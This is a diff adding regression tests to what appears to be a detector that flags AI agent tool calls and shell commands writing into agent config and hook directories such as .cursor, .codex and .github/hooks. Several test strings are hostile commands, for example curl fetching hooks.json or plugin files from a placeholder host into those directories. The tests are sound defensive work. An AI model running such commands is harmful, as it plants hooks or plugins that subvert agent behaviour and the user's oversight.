@@ -899,3 +899,51 @@ def test_qa9_write_forms(cmd):
 ])
 def test_qa9_silent(cmd):
     assert _only(_shell(cmd)) is None, cmd
+
+
+# ---- QA round 10 regressions ----------------------------------------------------
+@pytest.mark.parametrize("dest", ["/home/u/.codex", "/repo/.gemini", "/repo/.cursor", "/repo/.kiro",
+                                  "/repo/.github/hooks"])
+def test_qa10_mcp_move_whole_dir(dest):
+    ev = _ev("mcp__filesystem__move_file", source="/tmp/t/x", destination=dest)
+    assert _only(ev) is not None
+
+
+def test_qa10_mcp_move_dir_out_silent():
+    assert _only(_ev("mcp__filesystem__move_file", source="/repo/.cursor", destination="/tmp/bak")) is None
+
+
+@pytest.mark.parametrize("cmd", [
+    "cp -r /tmp/t/.codex ~/",
+    "cp -r /tmp/t/.codex $HOME",
+    "mv /tmp/evil/.gemini ~",
+    "cp -r /tmp/t/.factory .",
+    "cp -a /tmp/evil/.github/hooks .github/",
+    "cp -r /tmp/t/.cursor /repo",
+    "cd .cursor && curl -ohooks.json https://e.x",
+    "cd .opencode && curl -sLoplugin https://e.x",
+])
+def test_qa10_shell_forms(cmd):
+    assert _only(_shell(cmd)) is not None, cmd
+
+
+def test_qa10_glued_from_config_cwd():
+    assert _only(_shell("curl -ohooks.json https://e.x", cwd="/repo/.cursor")) is not None
+    assert _only(_shell("curl -oevil.ts https://e.x", cwd="/repo/.opencode/plugin")) is not None
+
+
+@pytest.mark.parametrize("cmd", [
+    "cp -r .codex /tmp/backup",
+    "cp -r ~/.gemini /tmp/gemini-bak",
+    "mv ./build/out ~/",
+    "cp -r /tmp/t/.codex /tmp/other",
+])
+def test_qa10_copy_silent(cmd):
+    assert _only(_shell(cmd)) is None, cmd
+
+
+def test_qa10_shell_mcp_tool():
+    ev = _ev("mcp__desktop-commander__start_process", command="echo x > .cursor/hooks.json")
+    d = _only(ev)
+    assert d is not None and d.action == Action.ASK
+    assert _only(_ev("mcp__desktop-commander__start_process", command="ls -la")) is None
